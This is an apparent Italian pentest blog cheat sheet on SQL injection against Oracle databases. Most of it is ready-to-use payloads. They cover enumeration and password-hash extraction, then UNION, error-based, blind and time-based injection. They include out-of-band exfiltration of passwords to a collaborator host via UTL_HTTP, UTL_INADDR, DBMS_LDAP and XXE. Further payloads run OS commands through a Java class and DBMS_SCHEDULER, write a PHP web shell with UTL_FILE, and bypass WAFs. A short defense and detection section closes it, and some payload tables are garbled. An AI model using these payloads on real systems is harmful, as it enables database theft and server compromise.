---
title: 'SQL Injection Oracle: Payload, Tecniche e Cheat Sheet'
slug: sql-injection-oracle
description: 'SQL injection su Oracle: payload UNION, error-based, blind e time-based, enumerazione con DUAL, test out-of-band, rischi di escalation ,exploit e difese.'
image: /oracle-sql-injection-pentest-cheat-sheet-hackita.webp
draft: true
date: 2026-11-08T10:34:10.018Z
categories:
  - web-hacking
subcategories:
  - expoit
tags:
  - SQL Injection
  - Oracle Database
  - UTL_FILE
  - Error-Based
  - SQLi
---

# SQL Injection su Oracle: Guida Pratica a Payload, Enumerazione ed Exploitation

**La SQL injection su Oracle è una vulnerabilità che permette di inserire codice SQL dentro una query dell'applicazione e farlo eseguire dal database Oracle.** Oracle ha una sintassi tutta sua (niente `LIMIT`, funzioni diverse, `DUAL` come tabella finta obbligatoria in molti casi) e un sistema di privilegi Java/PL-SQL che, con i permessi giusti, porta all'esecuzione di comandi sul server.

Questa guida copre rilevamento, enumerazione, credenziali, estrazione dati (UNION, error, blind, time-based), out-of-band, comandi, lettura/scrittura file e privilegi. Ogni payload è spiegato in parole semplici. *Ultimo aggiornamento: ottobre 2026.*

Da provare solo su lab e target autorizzati (Hack The Box, DVWA, PortSwigger Academy, CTF). Per la teoria generale parti da [SQL Injection](https://hackita.it/articoli/sql-injection/); per gli altri DBMS ci sono [SQL Injection MySQL](https://hackita.it/articoli/sql-injection-mysql/), [SQL Injection PostgreSQL](https://hackita.it/articoli/sql-injection-postgresql/) e [SQL Injection MSSQL](https://hackita.it/articoli/sql-injection-mssql/).

***

## Schemi di default in Oracle

| Nome     | Descrizione                                                  |
| -------- | ------------------------------------------------------------ |
| `SYSTEM` | Schema amministrativo, presente in tutte le versioni         |
| `SYSAUX` | Schema ausiliario di supporto, presente in tutte le versioni |

Non sono "database" come in MySQL: in Oracle ogni **utente** ha il proprio schema, e un'istanza contiene tutti gli schemi insieme (concettualmente più simile a PostgreSQL che a MySQL).

***

## Commenti in Oracle

| Tipo                    | Sintassi    |
| ----------------------- | ----------- |
| Commento a riga singola | `--`        |
| Commento multi-riga     | `/* ... */` |

Niente `#`: solo queste due forme, come in PostgreSQL.

***

## Come capire se il parametro è vulnerabile

```sql
?id=1'
?id=1''
?id=1 AND 1=1
?id=1 AND 1=2
?id=1 OR 1=1
```

Stessa logica degli altri DBMS: se la risposta cambia tra `1=1` (vero) e `1=2` (falso), il parametro finisce nella query. Una particolarità di Oracle: **non puoi fare `SELECT` senza `FROM`**. Se devi restituire un valore costante, serve la tabella finta `DUAL`:

```sql
SELECT 'test' FROM dual
```

La vedrai in quasi tutti i payload di questa guida.

***

## Enumerazione

| Cosa                | Query SQL                                                                                                                             |
| ------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| Versione del DBMS   | `SELECT banner FROM v$version` oppure `SELECT * FROM v$instance`                                                                      |
| Hostname del server | `SELECT UTL_INADDR.get_host_name FROM dual` oppure tramite `v$instance`                                                               |
| Nome del database   | `SELECT global_name FROM global_name` oppure `SELECT name FROM v$database` oppure `SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual` |

`v$version` e `v$instance` sono viste dinamiche di sistema (il prefisso `v$` indica dati in tempo reale sull'istanza). `UTL_INADDR` è un package integrato per operazioni di rete: oltre all'hostname, serve anche per le tecniche out-of-band viste più avanti.

***

## Credenziali del database

| Query                                   | Descrizione                                                              |
| --------------------------------------- | ------------------------------------------------------------------------ |
| `SELECT username FROM all_users;`       | Lista utenti, disponibile in tutte le versioni, senza privilegi speciali |
| `SELECT name, password FROM sys.user$;` | Hash delle password, privilegiata, **solo fino a Oracle 10g**            |
| `SELECT name, spare4 FROM sys.user$;`   | Hash delle password, privilegiata, **solo fino a Oracle 11g**            |

Da Oracle 12c in poi gli hash non sono più in queste colonne con lo stesso formato: Oracle ha spostato e rafforzato lo storage delle credenziali (hash SHA-512 con salt), e queste query legacy non restituiscono più nulla di utile. Se il target è aggiornato, concentrati sull'estrazione dei dati applicativi piuttosto che sugli hash di sistema.

***

## Metodologia: schemi, tabelle, colonne

```sql
-- List all existing schemas (owners)
SELECT DISTINCT owner FROM all_tables;
SELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)

-- List tables
SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;
SELECT OWNER, TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='<SCHEMA_NAME>'

-- Search tables for columns that look like they contain passwords
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';

-- List a table's columns
SELECT column_name FROM all_tab_columns WHERE table_name = 'TABLE_NAME';
SELECT COLUMN_NAME, DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='<TABLE_NAME>' AND OWNER='<SCHEMA_NAME>'
```

Le viste `all_*` (`all_tables`, `all_tab_columns`, `all_users`...) sono l'equivalente Oracle di `information_schema`: mostrano gli oggetti a cui l'utente corrente ha accesso. Esistono anche `user_*` (solo gli oggetti di tua proprietà) e `dba_*` (tutto il database, solo per chi ha privilegi DBA): se `all_tables` non basta, prova `dba_tables`.

**Nota sui nomi:** Oracle di default salva nomi di tabelle e colonne in **MAIUSCOLO**. Se nella query metti `WHERE table_name='utenti'` e non trovi nulla, prova `WHERE table_name='UTENTI'`.

***

## UNION Based

Stessa logica degli altri DBMS, con due differenze Oracle: niente `LIMIT`/`ORDER BY` per contare le colonne in modo comodo come in MySQL (si usa comunque `ORDER BY n` fino all'errore), e la tabella `DUAL` quando serve una riga sola.

```sql
-1' UNION SELECT NULL,NULL,NULL FROM dual--
-1' UNION SELECT NULL,banner,NULL FROM v$version--
-1' UNION SELECT NULL,table_name,NULL FROM all_tables WHERE ROWNUM=1--
```

`ROWNUM` è il modo Oracle di limitare le righe (non esiste `LIMIT`): `WHERE ROWNUM=1` prende solo la prima riga. Per prendere una riga a una posizione precisa (utile per enumerare una tabella alla volta) serve una sottoquery con `ROWNUM` e un filtro, perché `ROWNUM` da solo non supporta offset come `LIMIT n,1`.

***

## Error Based

Oracle offre diverse funzioni che vanno in errore mostrando il dato richiesto, ognuna legata a un componente diverso del database (motore XML, testo, geocoding...). Se un metodo è bloccato o disabilitato, prova il successivo.

| Tecnica                   | Payload                                                                                                                                      |   |                                                   |   |                                 |
| ------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------- | - | ------------------------------------------------- | - | ------------------------------- |
| Richiesta HTTP non valida | `SELECT utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1)) FROM dual`                                                   |   |                                                   |   |                                 |
| CTXSYS.DRITHSX.SN         | `SELECT CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE rownum=1)) FROM dual`                                                     |   |                                                   |   |                                 |
| XPath non valido          | `SELECT ordsys.ord_dicom.getmappingxpath((SELECT banner FROM v$version WHERE rownum=1),user,user) FROM dual`                                 |   |                                                   |   |                                 |
| XML non valido            | \`SELECT to\_char(dbms\_xmlgen.getxml('select "'                                                                                             |   | (SELECT user FROM sys.dual)                       |   | '" FROM sys.dual')) FROM dual\` |
| XML non valido (xmlagg)   | \`SELECT rtrim(extract(xmlagg(xmlelement("s", username                                                                                       |   | ',')),'/s').getstringval(),',') FROM all\_users\` |   |                                 |
| XDBURITYPE getblob        | `SELECT XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob() FROM dual`                                          |   |                                                   |   |                                 |
| XDBURITYPE getclob        | `SELECT XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob() FROM dual` |   |                                                   |   |                                 |
| DBMS\_UTILITY             | `AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'\|\|(SELECT banner FROM v$version)\|\|'~') -- -`                                                  |   |                                                   |   |                                 |

Se l'injection è dentro una stringa già apiciata, chiudi e concatena così: `'||payload--`.

Le prime tre righe sfruttano funzioni che si aspettano un parametro specifico (un hostname, una lingua, un percorso XPath) e restituiscono un errore che include quello che gli hai passato invece. Le righe XML usano `dbms_xmlgen` e `xmlagg`/`extract` per generare un documento XML malformato che contiene il dato. `XDBURITYPE` interpreta il tuo input come un URI e, se non è valido, lo segnala nell'errore. `DBMS_UTILITY.SQLID_TO_SQLHASH` si aspetta un ID di query (una stringa di 13 caratteri): passandogli qualcosa di più lungo, l'errore mostra cosa gli hai passato.

***

## Blind SQL Injection

Nessun errore, nessun output: solo vero o falso dalla risposta della pagina.

| Cosa testa                                   | Query                                                                                            |
| -------------------------------------------- | ------------------------------------------------------------------------------------------------ |
| La versione è 12.2                           | `SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';`                               |
| Le subselect funzionano                      | `SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)`                                                |
| Esiste la tabella `log_table`                | `SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM log_table);`                                          |
| Esiste la colonna `message` in `log_table`   | `SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';` |
| Il primo carattere del primo messaggio è `t` | `SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';`                            |

Lo schema è sempre lo stesso: trasformi la domanda in una condizione che restituisce una riga (vero) o nessuna riga (falso). Per leggere un dato carattere per carattere, usa `SUBSTR(colonna,posizione,1)` dentro un confronto, esattamente come su MySQL e PostgreSQL:

```sql
SELECT 1 FROM dual WHERE SUBSTR((SELECT password FROM users WHERE rownum=1),1,1)='a'
```

***

## Time Based

Oracle non ha una funzione `SLEEP()` diretta come MySQL o PostgreSQL. Il ritardo si ottiene con `DBMS_PIPE.RECEIVE_MESSAGE`, pensata per la comunicazione tra sessioni, che aspetta un messaggio su una "pipe" per un tempo massimo specificato.

```sql
AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)
```

`DBMS_PIPE.RECEIVE_MESSAGE(nome_pipe, secondi)` aspetta un messaggio sulla pipe `nome_pipe` per al massimo `secondi` secondi: siccome nessuno scrive mai su quella pipe, la funzione aspetta sempre il tempo massimo prima di restituire un codice di timeout. Il secondo payload lo mette dentro un `CASE WHEN`, così il ritardo avviene solo se la condizione è vera: è il modo per trasformare una domanda booleana in una risposta temporizzata, stesso principio di `IF(cond, SLEEP(n), 0)` su MySQL.

***

## Out of Band

Oracle può fare una richiesta di rete verso un host esterno **mentre analizza un documento XML**, perché il suo parser XML segue le entità esterne (DTD) per risolverle. È la tecnica nota come XXE-based OOB SQLi (collegata alla CVE-2014-6577).

```sql
SELECT EXTRACTVALUE(
  xmltype(
    '<?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE root [
       <!ENTITY % remote SYSTEM "http://YOUR-COLLABORATOR-DOMAIN/'||(SELECT user FROM dual)||'">
       %remote;
     ]>'
  ),
  '/l'
) FROM dual
```

Come funziona: `EXTRACTVALUE` analizza il documento XML che gli passi. Dentro quel documento c'è una `DOCTYPE` con un'entità esterna (`<!ENTITY % remote SYSTEM "http://...">`) il cui valore è costruito concatenando il risultato della tua sottoquery (qui `SELECT user FROM dual`) dentro l'URL. Quando Oracle risolve l'entità, fa una vera richiesta HTTP verso quell'URL, e il dato che ti interessa arriva nel path della richiesta — lo leggi nei log del tuo servizio di collaborazione (anche un semplice web server con logging va bene). Utile quando l'injection è completamente blind e il time-based è troppo lento o instabile.

***

## Stacked Queries

Supportate solo in contesti specifici, a seconda del driver e di come l'applicazione esegue le query (per esempio via blocchi PL/SQL anonimi). Quando funzionano, aprono la strada diretta a esecuzione di comandi e manipolazione file, che su Oracle sono spesso scritte come un blocco PL/SQL completo (`BEGIN ... END;`) piuttosto che una singola `SELECT`.

```sql
'; BEGIN NULL; END;--
```

Un payload innocuo come questo, se eseguito senza errori, confirma che puoi eseguire blocchi PL/SQL completi: da qui si passa alle tecniche sotto.

***

## Esecuzione di comandi

Oracle non ha un'unica funzione "esegui comando" come MySQL (`sys_exec` con UDF) o PostgreSQL (`COPY ... TO PROGRAM`): servono permessi Java o di scheduling, e quasi sempre privilegi elevati (spesso DBA).

### Tramite Java

Oracle integra una JVM dentro il database. Un account con il permesso di creare e eseguire codice Java può registrare una classe che lancia comandi di sistema:

```sql
-- 1. Grant the Java permission to execute files (needs an account with GRANT ANY PRIVILEGE or DBA)
BEGIN
  DBMS_JAVA.GRANT_PERMISSION('USER_NAME', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute');
END;
/

-- 2. Create a Java class that runs commands and returns the output
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "Exec" AS
import java.io.*;
public class Exec {
  public static String run(String cmd) throws IOException {
    BufferedReader r = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
    StringBuilder out = new StringBuilder();
    String line;
    while ((line = r.readLine()) != null) out.append(line).append("\n");
    return out.toString();
  }
};
/

-- 3. Expose the Java class as a PL/SQL function
CREATE OR REPLACE FUNCTION RUN_CMD(p_cmd IN VARCHAR2) RETURN VARCHAR2 AS
LANGUAGE JAVA NAME 'Exec.run(java.lang.String) return String';
/

-- 4. Run a command and read the output
SELECT RUN_CMD('id') FROM dual;
```

Richiede il permesso `DBMS_JAVA.GRANT_PERMISSION` (quindi di norma DBA) e, dalla versione 11 in su, in alcune configurazioni anche permessi Java aggiuntivi (`policy table` più restrittiva). Sulle versioni più vecchie bastava avere `CREATE PROCEDURE` o `CREATE JAVA SOURCE`. Strumenti come **ODAT** (Oracle Database Attacking Tool) automatizzano questo intero processo, incluso trovare la via giusta in base ai privilegi che hai.

### Tramite DBMS\_SCHEDULER

`DBMS_SCHEDULER` è il package di scheduling di Oracle (sostituto di `DBMS_JOB`): può lanciare un **programma esterno**, non solo codice PL/SQL interno.

```sql
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name            => 'SYS.CMD_JOB',
    job_type            => 'EXECUTABLE',
    job_action          => '/bin/bash',
    number_of_arguments => 2,
    enabled             => FALSE
  );
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('SYS.CMD_JOB', 1, '-c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('SYS.CMD_JOB', 2, 'id > /tmp/out.txt');
  DBMS_SCHEDULER.ENABLE('SYS.CMD_JOB');
END;
/
```

Il job viene creato disabilitato, gli argomenti vengono impostati uno a uno, e solo alla fine viene abilitato ed eseguito. Richiede il privilegio `CREATE JOB` (tipicamente concesso solo a DBA). L'output non torna nella risposta SQL: va scritto su file (come qui) o fatto uscire in altro modo (per esempio con una richiesta di rete, se il comando lo prevede).

***

## Leggere e scrivere file: UTL\_FILE

`UTL_FILE` è il package PL/SQL per leggere e scrivere file su disco, ma **lavora solo con cartelle che Oracle conosce già**: non puoi dargli un percorso assoluto a piacere come con `LOAD_FILE` di MySQL.

Prima controlli quali cartelle sono autorizzate:

```sql
SELECT directory_name, directory_path FROM all_directories;
```

Poi leggi un file da una di quelle cartelle:

```sql
DECLARE
  fh     UTL_FILE.FILE_TYPE;
  buffer VARCHAR2(4000);
BEGIN
  fh := UTL_FILE.FOPEN('DIRECTORY_NAME', 'file.txt', 'R');
  UTL_FILE.GET_LINE(fh, buffer);
  UTL_FILE.FCLOSE(fh);
  -- this is where "buffer" would be printed or exfiltrated
END;
/
```

E scrivi un file:

```sql
DECLARE
  fh UTL_FILE.FILE_TYPE;
BEGIN
  fh := UTL_FILE.FOPEN('DIRECTORY_NAME', 'shell.php', 'W');
  UTL_FILE.PUT_LINE(fh, '<?php system($_GET["cmd"]); ?>');
  UTL_FILE.FCLOSE(fh);
END;
/
```

`DIRECTORY_NAME` è un **oggetto DIRECTORY** già creato nel database (non un percorso scritto a mano): lo trovi con la query `all_directories` sopra. Su versioni molto vecchie (pre-9i) esisteva anche il parametro di inizializzazione `UTL_FILE_DIR`, ormai deprecato. Questo blocco funziona solo se l'applicazione esegue blocchi PL/SQL completi (quindi serve una stacked query, non una semplice `SELECT`): è il motivo per cui PayloadsAllTheThings segnala questa limitazione esplicitamente.

Il risultato di `UTL_FILE.GET_LINE` resta dentro la variabile `buffer` e non esce da solo: per leggerlo devi incanalarlo in qualcosa che l'applicazione mostra (per esempio una tabella temporanea che poi estrai con un error-based o una `SELECT`), oppure usarlo in una tecnica out-of-band come quella vista sopra.

***

## Privilegi

```sql
-- Current user's roles
SELECT * FROM user_role_privs;

-- Granted system privileges
SELECT * FROM user_sys_privs;

-- Are you DBA?
SELECT * FROM session_roles WHERE role = 'DBA';
```

Senza privilegi DBA, la maggior parte delle tecniche di comando e file viste sopra non funziona: resta comunque praticabile l'estrazione dati con UNION, error-based, blind e time-based, che su molte installazioni non richiedono permessi speciali.

***

## Bypass del WAF

Molti dei principi già visti per MySQL e PostgreSQL valgono anche qui, adattati alla sintassi Oracle.

### Apici bloccati

```sql
SELECT CHR(72)||CHR(73) FROM dual;  -- returns 'HI'
```

`CHR(n)` funziona come su PostgreSQL: un carattere per codice ASCII, concatenato con `||`.

### Parole chiave filtrate

| Se è bloccato                | Prova                                         |   |             |   |                                                          |
| ---------------------------- | --------------------------------------------- | - | ----------- | - | -------------------------------------------------------- |
| `UNION SELECT`               | `UNION ALL SELECT`                            |   |             |   |                                                          |
| `=`                          | `LIKE`                                        |   |             |   |                                                          |
| Nomi di colonna in minuscolo | MAIUSCOLO (Oracle li salva così di default)   |   |             |   |                                                          |
| `OR`/`AND`                   | Non esistono alternative dirette come `&&`/\` |   | `di MySQL:` |   | \` in Oracle è l'operatore di concatenazione, non logico |

### Spazi bloccati

Come su PostgreSQL e MySQL, i commenti `/**/` e le parentesi spesso bastano a sostituire gli spazi dove il parser lo permette.

***

## Tecniche avanzate extra: out-of-band alternativo con DBMS\_LDAP

Se `UTL_HTTP` (usato in alcuni contesti OOB più avanzati) è bloccato da una regola di rete o da un ACE (Access Control Entry) che limita le connessioni in uscita, `DBMS_LDAP` è spesso un'alternativa dimenticata: avvia comunque una connessione di rete verso un host a tua scelta, e basta che quella connessione fallisca o venga registrata per confermare l'exfiltrazione.

```sql
SELECT DBMS_LDAP.INIT((SELECT banner FROM v$version WHERE rownum=1)||'.YOUR-COLLABORATOR-DOMAIN', 80) FROM dual;
```

`DBMS_LDAP.INIT(host, porta)` tenta di inizializzare una connessione LDAP verso l'host specificato. Concatenando il risultato della tua sottoquery (qui la versione del database) dentro il nome host, quando Oracle tenta di risolvere quel nome fa una query DNS che arriva al tuo servizio di collaborazione — lo stesso principio dell'XXE-OOB visto sopra, ma senza passare per il parser XML. Utile quando un WAF o una regola di sicurezza blocca specificamente `EXTRACTVALUE`/`XMLTYPE` ma non riconosce `DBMS_LDAP` come sospetto.

***

## Tecniche avanzate extra: altre funzioni per time-based e OOB

**`dbms_lock.sleep` come alternativa a `DBMS_PIPE.RECEIVE_MESSAGE`.** Se il pacchetto `DBMS_PIPE` non è accessibile all'utente del database (succede su alcune configurazioni più blindate), puoi provare:

```sql
' AND 1=(SELECT CASE WHEN (1=1) THEN dbms_lock.sleep(5) ELSE 1 END FROM dual)-- -
```

Stessa logica del `DBMS_PIPE.RECEIVE_MESSAGE('a',5)` già visto: se la condizione è vera, il database aspetta 5 secondi prima di rispondere. Richiede però il privilegio `EXECUTE` su `DBMS_LOCK`, che non tutte le utenze hanno — per questo è una **alternativa** da provare se la prima tecnica non funziona, non un sostituto automatico.

**`UTL_HTTP.REQUEST` e `UTL_INADDR.get_host_address` come alternative OOB a `DBMS_LDAP`.** Oltre alla tecnica con `DBMS_LDAP.INIT` vista sopra, altre due funzioni possono far uscire dati verso un server che controlli:

```sql
SELECT UTL_HTTP.REQUEST('http://your-server.burpcollaborator.net/'||(SELECT password FROM users WHERE id=1)) FROM dual;

SELECT UTL_INADDR.get_host_address((SELECT password FROM users WHERE id=1)||'.your-server.burpcollaborator.net') FROM dual;
```

La prima fa una richiesta HTTP vera e propria con il dato incorporato nell'URL (utile se hai un listener HTTP, non solo DNS); la seconda forza una risoluzione DNS del dato concatenato come sottodominio, esattamente come con `UTL_INADDR.get_host_name` visto in precedenza. Quale delle tre funzioni (`DBMS_LDAP`, `UTL_HTTP`, `UTL_INADDR`) funziona dipende dai privilegi concessi e dalle regole di rete in uscita configurate sul database — motivo per cui conviene conoscerle tutte e provarle in sequenza.

## Automatizzare con sqlmap

```bash
sqlmap -u "http://target/page.php?id=1" --dbms=oracle --batch
sqlmap -u "http://target/page.php?id=1" --dbms=oracle --dbs
sqlmap -u "http://target/page.php?id=1" --dbms=oracle -D SCHEMA_NAME --tables
sqlmap -u "http://target/page.php?id=1" --dbms=oracle --technique=T
sqlmap -u "http://target/page.php?id=1" --dbms=oracle --privileges
```

Per l'exploitation avanzata su Oracle (Java, DBMS\_SCHEDULER, UTL\_FILE), lo strumento specializzato è **ODAT** (Oracle Database Attacking Tool), pensato apposta per questo DBMS: automatizza gran parte dei passaggi di comando e file visti sopra, scegliendo la tecnica giusta in base ai privilegi che trova.

***

## Flusso operativo: dal parametro ai dati

1. **Trova il parametro** e conferma con `'`, `AND 1=1` / `AND 1=2`.
2. **Enumera**: versione (`v$version`), hostname, nome database, utente corrente.
3. **Scegli la tecnica**: UNION se vedi output, error-based (una delle 8 funzioni) se vedi errori, blind/time-based (`DBMS_PIPE.RECEIVE_MESSAGE`) altrimenti.
4. **Enumera lo schema**: `all_tables`, `all_tab_columns`, ricordando il MAIUSCOLO.
5. **Controlla i privilegi**: `user_sys_privs`, `session_roles` — sei DBA?
6. **Se sei DBA (o hai i permessi Java/scheduler)**: valuta `DBMS_SCHEDULER` o Java per comandi, `UTL_FILE` per file (richiede stacked query e una DIRECTORY esistente).
7. **Se nessuna via diretta funziona**: resta sull'estrazione dati e valuta l'out-of-band via XXE.
8. **Documenta**: payload, risposta e impatto reale per il report.

***

## Come difendersi e come rilevare l'attacco

**Prevenzione**

* **Query parametrizzate (bind variables)** ovunque: in Oracle si chiamano proprio così, ed è la difesa che chiude il problema alla radice.
* **Privilegi minimi**: l'utente dell'applicazione non deve avere `CREATE JOB`, `CREATE JAVA SOURCE`, né i permessi Java per eseguire file o processi.
* **Rivedi `dba_java_policy`/`user_java_policy`** per permessi Java concessi senza motivo.
* **Limita gli oggetti DIRECTORY** usati da `UTL_FILE` alle sole cartelle strettamente necessarie, mai alla web root.
* **Non mostrare errori Oracle** all'utente finale: chiude l'error-based.
* **Patch regolari**: molte tecniche di comando sfruttano comportamenti noti da anni, corretti o limitati nelle versioni più recenti.

**Rilevazione**

* Nei log dell'applicazione cerca `DBMS_PIPE`, `UTL_INADDR`, `EXTRACTVALUE`, `DBMS_SCHEDULER`, `UTL_FILE`, `all_tables`, `v$version`.
* Negli audit log di Oracle (`DBA_AUDIT_TRAIL` se l'auditing è attivo) controlla la creazione di job di scheduling, classi Java e oggetti DIRECTORY non previsti.
* Allarme su richieste di rete in uscita dal server database verso domini sconosciuti (segno di tecnica out-of-band).

***

## Domande frequenti

### Cos'è una SQL injection su Oracle?

È una vulnerabilità in cui l'input dell'utente finisce senza controlli dentro una query eseguita da un database Oracle, permettendo di leggere dati, bypassare autenticazioni e, con privilegi elevati (spesso DBA), eseguire comandi o leggere/scrivere file sul server.

### Come faccio a sapere se un sito usa Oracle?

Un errore con la dicitura "ORA-" (per esempio "ORA-00933: SQL command not properly ended") è il segnale più diretto. Senza errori visibili, `DBMS_PIPE.RECEIVE_MESSAGE` è specifica di Oracle e non esiste altrove. Anche la porta 1521 aperta è un indizio.

### Perché su Oracle non c'è un `SLEEP()` come MySQL?

Oracle non ha mai incluso una funzione di pausa diretta pensata per questo; `DBMS_PIPE.RECEIVE_MESSAGE` nasce per la comunicazione tra sessioni e viene riadattata come timer, sfruttando il timeout dell'attesa su una pipe senza messaggi.

### Perché mi serve sempre `FROM dual`?

Perché in Oracle `SELECT` senza `FROM` non è sintassi valida. `DUAL` è una tabella di sistema con una sola riga, pensata apposta per restituire un valore costante o il risultato di una funzione.

### Posso leggere qualsiasi file con UTL\_FILE?

No: solo le cartelle registrate come oggetti DIRECTORY nel database (vedi `all_directories`). Non esiste un equivalente diretto di `LOAD_FILE('/percorso/qualsiasi')` di MySQL.

### Qual è la tecnica migliore da usare?

UNION se l'output è visibile, error-based (prova le diverse funzioni, una delle otto quasi sempre funziona) se vedi gli errori, time-based con `DBMS_PIPE.RECEIVE_MESSAGE` come ultima risorsa. Per la teoria generale vedi [SQL Injection Classica](https://hackita.it/articoli/sql-injection-classica/) e [Blind SQL Injection](https://hackita.it/articoli/blind-sql-injection/).

### Come mi esercito in modo legale?

Con ambienti autorizzati: DVWA, i lab PortSwigger Academy, le macchine di Hack The Box e i CTF. Mai su siti senza autorizzazione scritta.

***

## Conclusione

Oracle si distingue dagli altri DBMS per due motivi: una sintassi più rigida (niente `SELECT` senza `FROM`, `DUAL` ovunque, `ROWNUM` invece di `LIMIT`) e un sistema di privilegi Java/PL-SQL che, da DBA, porta all'esecuzione di comandi in più modi diversi. Le otto varianti di error-based coprono quasi ogni scenario in cui gli errori sono visibili, mentre `DBMS_PIPE.RECEIVE_MESSAGE` resta l'unica via per il time-based quando non vedi nulla.

Questa guida segue la struttura della pagina Oracle di [PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/OracleSQL%20Injection/), arricchita con spiegazioni, requisiti di privilegio e difese.
